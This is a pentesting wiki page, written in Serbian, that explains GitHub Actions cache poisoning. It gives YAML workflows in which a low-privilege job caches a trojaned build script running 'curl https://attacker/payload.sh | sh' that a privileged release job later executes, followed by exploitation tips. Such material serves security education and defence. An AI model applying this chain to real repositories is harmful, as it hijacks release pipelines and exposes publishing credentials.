# GH Actions - Cache Poisoning

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

GitHub Actions cache je globalan za repozitorijum. Bilo koji workflow koji zna cache `key` (ili `restore-keys`) može popuniti taj unos, čak i ako job ima samo `permissions: contents: read`. GitHub ne razdvaja cache-e po workflow-u, tipu događaja ili nivou poverenja, pa napadač koji kompromituje posao sa niskim privilegijama može poison a cache koji će kasnije restore-ovati privilegovani release job. Ovako je Ultralytics compromise pivoted from a `pull_request_target` workflow into the PyPI publishing pipeline.

## Osnovni elementi napada

- `actions/cache` izlaže i restore i save operacije (`actions/cache@v4`, `actions/cache/save@v4`, `actions/cache/restore@v4`). Poziv za save je dozvoljen za bilo koji job osim za zaista nepouzdane `pull_request` workflow-e pokrenute iz forkova.
- Cache unosi se identifikuju isključivo pomoću `key`. Široki `restore-keys` olakšavaju ubacivanje payloads jer napadaču je dovoljno da se poklopi sa prefiksom.
- Keširani datotečni sistem se vraća doslovno. Ako cache sadrži skripte ili binarne fajlove koji se kasnije izvršavaju, napadač kontroliše taj put izvršavanja.

## Primer lanca eksploatacije

_Author workflow (`pull_request_target`) poisoned the cache:_
```yaml
steps:
- run: |
mkdir -p toolchain/bin
printf '#!/bin/sh\ncurl https://attacker/payload.sh | sh\n' > toolchain/bin/build
chmod +x toolchain/bin/build
- uses: actions/cache/save@v4
with:
path: toolchain
key: linux-build-${{ hashFiles('toolchain.lock') }}
```
_Prilegovan workflow je obnovljen i izvršio poisoned cache:_
```yaml
steps:
- uses: actions/cache/restore@v4
with:
path: toolchain
key: linux-build-${{ hashFiles('toolchain.lock') }}
- run: toolchain/bin/build release.tar.gz
```
Drugi job sada izvršava kod pod kontrolom napadača dok poseduje kredencijale za release (PyPI tokens, PATs, cloud deploy keys, etc.).

## Praktični saveti za eksploataciju

- Ciljajte workflows pokrenute `pull_request_target`, `issue_comment` ili bot komandama koje i dalje čuvaju caches; GitHub im dozvoljava da prepišu ključeve koji važe za ceo repozitorijum čak i kada runner ima samo pristup za čitanje.
- Tražite determinističke cache ključeve koji se ponovo koriste preko granica poverenja (na primer, `pip-${{ hashFiles('poetry.lock') }}`) ili permisivne `restore-keys`, pa sačuvajte svoj maliciozni tarball pre nego što privilegovani workflow bude pokrenut.
- Pratite logove za `Cache saved` unose ili dodajte sopstveni cache-save korak, kako bi sledeći release job restore-ovao payload i izvršio trojanized scripts or binaries.

## References

- [A Survey of 2024–2025 Open-Source Supply-Chain Compromises and Their Root Causes](https://words.filippo.io/compromise-survey/)

{{#include ../../../banners/hacktricks-training.md}}
